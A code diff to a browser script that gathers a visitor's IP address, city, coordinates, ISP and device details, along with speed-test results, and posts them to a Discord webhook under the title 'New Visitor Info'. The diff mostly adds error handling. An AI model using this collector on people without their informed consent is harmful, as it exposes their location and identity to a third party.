@@ -53,27 +53,38 @@ async function fetchGeo() {
 
 // --- Network tests ---
 async function testPing() {
-  const url = "https://www.cloudflare.com/cdn-cgi/trace";
-  const attempts = 3;
-  let times = [];
-  for (let i = 0; i < attempts; i++) {
-    const start = performance.now();
-    await fetch(url, { cache: "no-store" });
-    times.push(performance.now() - start);
+  try {
+    const url = "https://www.cloudflare.com/cdn-cgi/trace";
+    const attempts = 3;
+    let times = [];
+    for (let i = 0; i < attempts; i++) {
+      const start = performance.now();
+      await fetch(url, { cache: "no-store" });
+      times.push(performance.now() - start);
+    }
+    const avg = times.reduce((a,b) => a+b,0) / times.length;
+    return Math.round(avg);
+  } catch (e) {
+    console.warn("Ping failed:", e.message);
+    return "n/a";
   }
-  const avg = times.reduce((a,b) => a+b,0) / times.length;
-  return Math.round(avg);
 }
 
 async function testDownload() {
-  const url = "./testfile.bin"; // local file hosted in repo
-  const start = performance.now();
-  const res = await fetch(url, { cache: "no-store" });
-  const blob = await res.blob();
-  const end = performance.now();
-  const seconds = (end - start) / 1000;
-  const mbps = (blob.size * 8 / 1_000_000) / seconds;
-  return mbps.toFixed(2);
+  try {
+    const url = "./testfile.bin"; // local file hosted in repo
+    const start = performance.now();
+    const res = await fetch(url, { cache: "no-store" });
+    if (!res.ok) throw new Error("Download failed: " + res.status);
+    const blob = await res.blob();
+    const end = performance.now();
+    const seconds = (end - start) / 1000;
+    const mbps = (blob.size * 8 / 1_000_000) / seconds;
+    return mbps.toFixed(2);
+  } catch (err) {
+    console.warn("Download test failed:", err.message);
+    return "n/a";
+  }
 }
 
 // Send results to Discord
@@ -82,30 +93,35 @@ async function sendToDiscord(payload) {
     console.warn('Webhook not set, skipping.');
     return { skipped: true };
   }
-  const body = {
-    content: '```json\n' + safeStringify(payload) + '\n```',
-    embeds: [{
-      title: 'New Visitor Info',
-      color: 3447003,
-      fields: [
-        { name: 'IP', value: payload.ip || 'n/a', inline: true },
-        { name: 'Country', value: payload.country || 'n/a', inline: true },
-        { name: 'City', value: payload.city || 'n/a', inline: true },
-        { name: 'Ping (ms)', value: String(payload.ping || 'n/a'), inline: true },
-        { name: 'Download (Mbps)', value: String(payload.downloadMbps || 'n/a'), inline: true },
-        { name: 'Device RAM (GB)', value: String(payload.deviceMemory || 'n/a'), inline: true },
-        { name: 'CPU Cores', value: String(payload.cpuCores || 'n/a'), inline: true }
-      ],
-      timestamp: new Date().toISOString()
-    }]
-  };
-  const res = await fetch(DISCORD_WEBHOOK_URL, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(body)
-  });
-  if (!res.ok) throw new Error('Webhook returned ' + res.status);
-  return { success: true };
+  try {
+    const body = {
+      content: '```json\n' + safeStringify(payload) + '\n```',
+      embeds: [{
+        title: 'New Visitor Info',
+        color: 3447003,
+        fields: [
+          { name: 'IP', value: payload.ip || 'n/a', inline: true },
+          { name: 'Country', value: payload.country || 'n/a', inline: true },
+          { name: 'City', value: payload.city || 'n/a', inline: true },
+          { name: 'Ping (ms)', value: String(payload.ping || 'n/a'), inline: true },
+          { name: 'Download (Mbps)', value: String(payload.downloadMbps || 'n/a'), inline: true },
+          { name: 'Device RAM (GB)', value: String(payload.deviceMemory || 'n/a'), inline: true },
+          { name: 'CPU Cores', value: String(payload.cpuCores || 'n/a'), inline: true }
+        ],
+        timestamp: new Date().toISOString()
+      }]
+    };
+    const res = await fetch(DISCORD_WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body)
+    });
+    if (!res.ok) throw new Error('Webhook returned ' + res.status);
+    return { success: true };
+  } catch (err) {
+    console.warn("Discord failed:", err.message);
+    return { success: false };
+  }
 }
 
 // --- Main flow ---
@@ -113,41 +129,47 @@ btn.addEventListener('click', async () => {
   btn.disabled = true;
   showSpinner(true);
   statusEl().textContent = 'Collecting...';
-  try {
-    const client = collectClientInfo();
-    statusEl().textContent = 'Fetching IP & geo...';
-    const geo = await fetchGeo();
-    statusEl().textContent = 'Testing ping...';
-    const ping = await testPing();
-    statusEl().textContent = 'Testing download speed...';
-    const downloadMbps = await testDownload();
-    const [lat, lon] = geo.loc ? geo.loc.split(",") : [null, null];
-    const full = Object.assign({}, client, {
-      ip: geo.ip || null,
-      city: geo.city || null,
-      region: geo.region || null,
-      country: geo.country || null,
-      latitude: lat,
-      longitude: lon,
-      isp: geo.org || null,
-      ping,
-      downloadMbps,
-      geo_raw: geo
-    });
-    outputEl().textContent = safeStringify(full);
-    statusEl().textContent = 'Sending to Discord...';
-    const sendRes = await sendToDiscord(full);
-    if (sendRes.skipped) {
-      statusEl().textContent = 'Done — webhook not set.';
-    } else {
-      statusEl().textContent = 'Done — sent to Discord.';
-    }
-  } catch (err) {
-    console.error(err);
-    statusEl().textContent = 'Error: ' + err.message;
-    outputEl().textContent = 'Error: ' + err.message;
-  } finally {
-    btn.disabled = false;
-    showSpinner(false);
+
+  const full = collectClientInfo();
+
+  // GEO
+  statusEl().textContent = 'Fetching IP & geo...';
+  const geo = await fetchGeo();
+  Object.assign(full, {
+    ip: geo.ip || "unknown",
+    city: geo.city || "unknown",
+    region: geo.region || "unknown",
+    country: geo.country || "unknown",
+    isp: geo.org || "unknown"
+  });
+  if (geo.loc) {
+    const [lat, lon] = geo.loc.split(",");
+    full.latitude = lat;
+    full.longitude = lon;
   }
+
+  // PING
+  statusEl().textContent = 'Testing ping...';
+  full.ping = await testPing();
+
+  // DOWNLOAD
+  statusEl().textContent = 'Testing download speed...';
+  full.downloadMbps = await testDownload();
+
+  // Show results immediately
+  outputEl().textContent = safeStringify(full);
+
+  // Send to Discord (optional)
+  statusEl().textContent = 'Sending to Discord...';
+  const sendRes = await sendToDiscord(full);
+  if (sendRes.skipped) {
+    statusEl().textContent = 'Done — webhook not set.';
+  } else if (sendRes.success) {
+    statusEl().textContent = 'Done — sent to Discord.';
+  } else {
+    statusEl().textContent = 'Done — Discord send failed.';
+  }
+
+  btn.disabled = false;
+  showSpinner(false);
 });
